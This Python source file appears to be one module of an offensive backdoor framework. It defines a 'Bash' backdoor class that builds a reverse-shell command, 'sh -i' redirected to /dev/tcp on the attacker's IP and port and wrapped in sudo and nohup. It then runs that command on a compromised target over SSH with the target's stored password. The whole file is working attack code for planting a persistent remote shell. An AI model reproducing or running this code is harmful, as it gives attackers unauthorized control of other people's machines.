from backdoors.backdoor import *

class Bash(Backdoor):
    prompt = Fore.RED + "(sh) " + Fore.BLUE + ">> " + Fore.RESET 
    
    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using Sh backdoor..."
        self.core = core
        self.options = {
                "port"   : Option("port", 53935, "port to connect to", True),
                }
        
        self.modules = {} 
        self.allow_modules = True
        self.help_text = INFO + "Uses a simple sh command to connect to a specific ip and port combination, and pipes its input into a sh shell." 

    def get_command(self):
        return "sudo -S nohup sh -i >& /dev/tcp/" + self.core.localIP + "/%s 0>&1" % self.get_value("port")

    def do_exploit(self, args):
        port = self.get_value("port")
        target = self.core.curtarget
        print(GOOD + "Initializing backdoor...")
        self.listen(target.pword, "none")
        target.ssh.exec_command(self.get_command())
        print(GOOD + "Sh Backdoor on port " + str(port) + " attempted.")
        for mod in self.modules.keys():
            print(INFO + "Attempting to execute " + mod.name + " module...")
            mod.exploit()